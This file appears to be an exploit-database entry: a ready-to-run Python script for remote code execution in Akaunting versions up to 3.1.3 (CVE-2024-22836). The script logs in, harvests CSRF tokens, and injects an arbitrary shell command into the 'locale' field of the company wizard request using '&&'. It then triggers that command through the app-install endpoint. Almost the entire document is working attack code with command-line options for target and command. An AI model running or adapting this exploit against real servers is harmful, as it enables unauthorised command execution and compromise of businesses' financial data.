@@ -1,0 +1,129 @@
+id: 39433
+date: 03/11/2024
+title: Akaunting < 3.1.3 - Remote Code Execution Exploit
+author: u32i
+cves: CVE-2024-22836
+
+# Exploit Title: Akaunting < 3.1.3 - RCE
+# Exploit Author: u32i@proton.me
+# Vendor Homepage: https://akaunting.com
+# Software Link: https://github.com/akaunting/akaunting
+# Version: <= 3.1.3
+# Tested on: Ubuntu (22.04)
+# CVE : CVE-2024-22836
+
+#!/usr/bin/python3
+
+import sys
+import re
+import requests
+import argparse
+
+def get_company():
+	# print("[INF] Retrieving company id...")
+	res = requests.get(target, headers=headers, cookies=cookies, allow_redirects=False)
+	if res.status_code != 302:
+		print("[ERR] No company id was found!")
+		sys.exit(3)
+	cid = res.headers['Location'].split('/')[-1]
+	if cid == "login":
+		print("[ERR] Invalid session cookie!")
+		sys.exit(7)
+	return cid
+
+def get_tokens(url):
+	res = requests.get(url, headers=headers, cookies=cookies, allow_redirects=False)
+	search_res = re.search(r"\"csrfToken\"\:\".*\"", res.text)
+
+	if not search_res:
+		print("[ERR] Couldn't get csrf token")
+		sys.exit(1)
+
+	data = {}
+	data['csrf_token'] = search_res.group().split(':')[-1:][0].replace('"', '')
+	data['session'] = res.cookies.get('akaunting_session')
+	return data
+
+def inject_command(cmd):
+	url = f"{target}/{company_id}/wizard/companies"
+	tokens = get_tokens(url)
+	headers.update({"X-Csrf-Token": tokens['csrf_token']})
+	data = {"_token": tokens['csrf_token'], "_method": "POST", "_prefix": "company", "locale": f"en_US && {cmd}"}
+	res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False)
+	if res.status_code == 200:
+		res_data = res.json()
+		if res_data['error']:
+			print("[ERR] Command injection failed!")
+			sys.exit(4)
+		print("[INF] Command injected!")
+
+
+def trigger_rce(app, version = "1.0.0"):
+	print("[INF] Executing the command...")
+	url = f"{target}/{company_id}/apps/install"
+	data = {"alias": app, "version": version, "path": f"apps/{app}/download"}
+	headers.update({"Content-Type":"application/json"})
+	res = requests.post(url, headers=headers, cookies=cookies, json=data, allow_redirects=False)
+	if res.status_code == 200:
+		res_data = res.json()
+		if res_data['error']:
+			search_res = re.search(r">Exit Code\:.*<", res_data['message'])
+			if search_res:
+				print("[ERR] Failed to execute the command")
+				sys.exit(6)
+			print("[ERR] Failed to install the app! no command was executed!")
+			sys.exit(5)
+		print("[INF] Executed successfully!")
+
+def login(email, password):
+	url = f"{target}/auth/login"
+	tokens = get_tokens(url)
+
+	cookies.update({
+		'akaunting_session': tokens['session']
+	})
+
+	data = {
+		"_token": tokens['csrf_token'],
+		"_method": "POST",
+		"email": email,
+		"password": password
+	}
+	
+	req = requests.post(url, headers=headers, cookies=cookies, data=data)
+	res = req.json()
+	if res['error']:
+		print("[ERR] Failed to log in!")
+		sys.exit(8)
+
+	print("[INF] Logged in")
+	cookies.update({'akaunting_session': req.cookies.get('akaunting_session')})
+		
+def main():
+	inject_command(args.command)
+	trigger_rce(args.alias, args.version)
+
+if __name__=='__main__':
+	parser = argparse.ArgumentParser()
+	parser.add_argument("-u", "--url", help="target url")
+	parser.add_argument("--email", help="user login email.")
+	parser.add_argument("--password", help="user login password.")
+	parser.add_argument("-i", "--id", type=int, help="company id (optional).")
+	parser.add_argument("-c", "--command", help="command to execute.")
+	parser.add_argument("-a", "--alias", help="app alias, default: paypal-standard", default="paypal-standard")
+	parser.add_argument("-av", "--version", help="app version, default: 3.0.2", default="3.0.2")
+
+	args = parser.parse_args()
+	
+	headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36"}
+	cookies = {}
+	target = args.url
+
+	try:
+		login(args.email, args.password)
+		company_id = get_company() if not args.id else args.id
+		main()
+	except:
+		sys.exit(0)
+
+#  0day.today [2024-03-15]  #
